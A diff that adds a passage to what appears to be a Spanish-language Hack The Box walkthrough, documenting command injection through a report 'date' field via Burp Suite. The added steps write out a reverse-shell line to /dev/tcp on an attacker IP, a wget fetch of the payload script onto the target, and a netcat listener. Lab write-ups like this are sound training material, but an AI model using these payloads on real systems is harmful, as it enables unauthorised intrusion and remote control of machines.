@@ -116,8 +116,82 @@ Y al presionar el botón 'Generate Report' podremos ver la petición en el Burp 
 
 ![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/70c9c307-27f9-4a36-a987-dc4a061517e8)
 
-Una ve
+Una vez alli probamos con el comando ls para investigar que hay
 
+![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/62438378-1563-413b-8112-b706ef297575)
+
+Donde podemos observar los archivos que componen la web. Nuestro objetivo será entrar a la máquina para obtener las banderas, por lo que desde aquí todavia no tenemos acceso a ella. 
+
+Procedemos a preguntar cual es el usuario actual con el siguiente comando
+
+```
+whoami
+```
+
+![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/69fdf2aa-2be7-4c2e-b79d-1f28dd94825f)
+
+Donde podremos observar que no es el usuario root, y por lo tanto podemos deducir que es al primero al que atacaremos para obtener la bandera
+
+![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/58b7af12-4754-4e83-9498-5ef6641b700d)
+
+Una vez realizado el paso anterior, procedemos a escuchar el puerto 3333 en mi caso que a donde voy a realizar la solicitud. 
+
+```
+python3 -m http.server 3333
+```
+
+![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/c97788fb-7232-4ab2-b86b-d86dfe573949)
+
+Luego procedemos a crear un archivo de script (payload.sh en este caso) que contiene un comando de shell inversa. Este comando intenta establecer una conexión de shell inversa a la dirección IP 10.10.14.28 en el puerto 9090.
+
+```
+echo "sh -i > & /dev/tcp/10.10.14.28/9090 0>&1" | tee -a payload.sh
+```
+
+También le otorgamos permisos de ejecución al archivo
+
+```
+chmod +x payload.sh
+```
+
+![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/7ed3a828-f13e-416c-8b86-53c98df9103e)
+
+
+Una vez puesto el puerto a escuchar procedemos a realizar la siguiente solicitud en la página para verificar de que si se esta trayendo la información 
+
+```
+wget http://10.10.14.28:3333/payload.sh
+```
+
+![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/f2c103a8-a713-49f4-8cfb-a51c14da7a61)
+
+Y una vez relizada la petición procedemos a mirar la terminal
+
+![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/6229ac2b-eaa4-47a5-a459-e3652a130019)
+
+Además de eso procedemos a crear un servidor de escucha para el puerto 9090, que fue al que añadimos al payload 
+
+```
+nc -lvnp 9090
+```
+
+![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/2c95f891-ff1e-4107-b4c9-0ec3c8ac8acc)
+
+Y en el Burp Suite procedemos a enviarle por medio del campo date lo siguiente 
+
+```
+bash payload.sh
+```
+
+![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/66a4b439-0276-4f83-babe-8891a672ffca)
+
+Y una vez realizada la solicitud, volvemos a la terminal para ver que ya se tiene acceso
+
+![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/1e149ec7-549a-4e9f-a68a-dc79f9616922)
+
+Procedemos a preguntar quienes somos y en que directorio estamos ubicados, para luego listar y ver lo que se tiene 
+
+![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/a0781191-ff1f-42ca-8f31-f9d5aed300e2)
 
 
 
